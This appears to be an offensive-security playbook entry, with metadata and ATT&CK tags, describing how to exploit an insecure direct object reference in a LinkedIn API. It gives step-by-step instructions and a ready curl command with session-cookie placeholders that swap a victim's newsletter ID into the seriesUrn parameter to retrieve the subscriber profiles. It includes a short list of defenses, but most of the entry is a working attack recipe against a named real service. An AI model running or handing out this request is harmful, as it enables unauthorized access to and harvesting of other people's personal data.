---
tags:
  - request-replay
  - idor-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-linkedin-subscribers-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:47.233Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c9c6f2c8-6f7f-409a-b6d2-6041551567cf
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Replay-Request-with-Victim-NewsletterId

## Summary

Modify the captured API request by replacing the seriesUrn with a victim's NewsletterId and resend to access unauthorized data.

## Description

Exploit the IDOR by tampering with the seriesUrn parameter, which lacks server-side authorization. Victim's ID is publicly available from their profile. Expected outcome: Disclosure of subscriber details without access checks.

## Requirements

1. Captured legitimate request
2. Victim's NewsletterId
3. Valid session cookies

## Defense

Defensive measures and detection strategies:

- Implement server-side ownership validation for seriesUrn
- Log anomalous API parameter values
- Use signed requests

## Objectives

1. Bypass authorization
2. Retrieve victim data
3. Demonstrate privacy impact

## Instructions

### Step 1: Obtain Victim ID

**Context**: Get public NewsletterId.

View victim's newsletter page; extract ID from URL or source.

> Expected: ID like 123456789.

### Step 2: Modify and Replay

**Context**: Alter seriesUrn and send.

In Burp Repeater, change to urn%3Ali%3Afsd_contentSeries%3A<victimId>. Or use [[commands/curl-linkedin-subscribers-request]]:

```bash
curl -H "Cookie: li_at=<your-token>; JSESSIONID=<session>" "https://www.linkedin.com/voyager/api/voyagerPublishingDashSeriesSubscribers?decorationId=com.linkedin.voyager.dash.deco.publishing.SeriesSubscriberMiniProfile-2&count=10&q=contentSeries&seriesUrn=urn%3Ali%3Afsd_contentSeries%3A<victimId>&start=0" -v
```

> Response: JSON with elements array of subscriber profiles.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-linkedin-subscribers-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[request-replay]]
- [[idor-exploit]]
